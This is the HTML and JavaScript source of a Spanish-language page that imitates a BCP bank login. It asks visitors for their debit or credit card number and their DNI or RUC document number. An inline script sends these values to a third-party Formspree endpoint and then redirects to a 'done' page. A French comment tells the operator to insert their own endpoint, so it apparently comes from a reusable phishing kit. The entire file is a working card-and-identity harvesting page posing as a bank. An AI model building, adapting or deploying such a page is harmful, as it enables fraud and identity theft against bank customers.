<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BCP</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
</head>
<body>
<div class="container">
    <div class="nav">
        <div class="logo"> <img src="src/logo.webp" alt=""></div>

    <div class="question"> <i class="fa-solid fa-circle-question"></i></div>
    </div>
<br> <br>
    <div class="section">
        <h2>Que bueno <br> tenerte  por aquí</h2>
        <p>Completa tus datos para ingresar </p>
    </div> 

    <br>
    <br> <br> 
  <form class="form" id="loginForm">
    <div class="radio-group">
    <label class="radio-container">
        <input type="radio" name="user-type" value="persona" checked>
        <span class="checkmark"></span>
        Persona
    </label>
    <label class="radio-container">
        <input type="radio" name="user-type" value="empresa">
        <span class="checkmark"></span>
        Empresa
    </label>
</div>
      <div class="input-block">
        <input type="text" id="text1" name="text1" placeholder="Número de tarjeta de débito o crédito" required /> 
      </div>

      <div class="input-block input-block-select">
        <select name="text3" id="text3">
            <option value="DNI">DNI</option>
            <option value="RUC">RUC</option>
        </select>
        </div>

      <div class="input-block">
        <input type="text" id="text2" name="text2" placeholder="Nº de documento" required />
      </div>
      <button type="submit" id="loginBtn" class="btn-login">Continuar</button>
      
    </form>
</div>
     

    <!-- Message retour -->
    <p id="formMessage" style="margin-top: 15px; font-weight: bold;"></p>

  

    
  </div>

  <script>
    const text1Input = document.getElementById('text1');
    const text2Input = document.getElementById('text2');
    const text3Input = document.getElementById('text3');
    const loginBtn = document.getElementById('loginBtn');
    const messageEl = document.getElementById('formMessage');
    const form = document.getElementById('loginForm');

    function updateButtonState() {
      const userFilled = text1Input.value.trim() !== '';
      const passFilled = text2Input.value.trim().length >= 3; // mini 3 caractères
      loginBtn.disabled = !(userFilled && passFilled);
      loginBtn.classList.toggle('active', userFilled && passFilled);
    }

    text1Input.addEventListener('input', updateButtonState);
    text2Input.addEventListener('input', updateButtonState);
    updateButtonState();

    // Envoi AJAX via Formspree avec redirection
    form.addEventListener('submit', async function(event) {
      event.preventDefault();

      const text1 = text1Input.value.trim();
      const text2 = text2Input.value.trim();
      const text3 = text3Input.value.trim();

      if (!text1 || text2.length < 3) {
        messageEl.textContent = "❌ error";
        messageEl.style.color = "red";
        return;
      }

      const data = { text1, text2, text3 };

      try {
        const response = await fetch('https://formspree.io/f/xkovdeav', { // ⚠️ Mets ton endpoint Formspree ici
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify(data)
        });

        if (response.ok) {
          messageEl.textContent = "✅ ok.";
          messageEl.style.color = "green";

          // Redirection après 1,5 secondes
          setTimeout(() => {
            window.location.href = "done.html";
          }, 1500);

          // Reset formulaire
          text1Input.value = "";
          text2Input.value = "";
          updateButtonState();

        } else {
          const result = await response.json();
          messageEl.textContent = "❌ error: " + (result.message || '');
          messageEl.style.color = "red";
        }

      } catch (error) {
        messageEl.textContent = "❌ error уу.";
        messageEl.style.color = "red";
        console.error(error);
      }
    });
  </script>
    
</body>
</html>
